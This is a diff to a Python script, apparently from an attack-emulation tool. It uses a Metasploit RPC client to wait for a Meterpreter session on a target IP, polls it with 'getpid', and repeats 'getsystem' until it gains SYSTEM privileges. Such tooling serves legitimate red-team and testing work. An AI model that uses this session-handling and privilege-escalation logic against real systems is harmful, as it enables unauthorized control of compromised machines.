@@ -23,20 +23,26 @@ def run(client, ip_address='', need_privilege=False, meterpreter=True, time_out_
                 if(meterpreter is True and 'MeterpreterSession' not in str(type(shell))):
                     continue # eg. target can hv both Shell & Meterpreter session
                 if(not need_privilege):
-                    sleep(10) # let session fully establish
-                    return key
+                    r = ''
+                    while True:
+                        shell.write('getpid\n')
+                        sleep(2)
+                        if 'Current' in shell.read():
+                            sleep(5)
+                            return key
                 else: # MSF is rather different from Empire
-                    shell = client.sessions.session(key)
-                    shell.write('getsystem') # needs explicit getsystem
-                    sleep(5)
+                    shell.write('getsystem\n') # needs explicit getsystem
                     r = shell.read()
-                    while len(r) == 0: # results are not immediate
+                    while 'Unknown command' in r: # session needs a while to settle
+                        shell.write('getsystem\n')
                         sleep(5)
                         r = shell.read()
-                        if ("denied" in r): 
-                            break # denied, give up
-                        if (time_out < 0):
-                            raise ValueError('Wait for session timeout')                        
+                        print(r)
+                    if ("denied" in r or 'failed' in r): 
+                        shell.write('whoami')
+                        raise ValueError('getsystem failed')
+                    if (time_out < 0):
+                        raise ValueError('Wait for session timeout')                        
                     if("got system" in r): # return only when got system
                         sleep(10) # let session fully establish
                         return key
@@ -50,4 +56,4 @@ def run(client, ip_address='', need_privilege=False, meterpreter=True, time_out_
 if __name__ == '__main__':
     client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
     #print(str(run(client, '192.168.181.174'))) # session that's non-privileged
-    print(str(run(client, '192.168.181.174', True))) # session without high-integrity
+    print(str(run(client, need_privilege=True))) # session without high-integrity
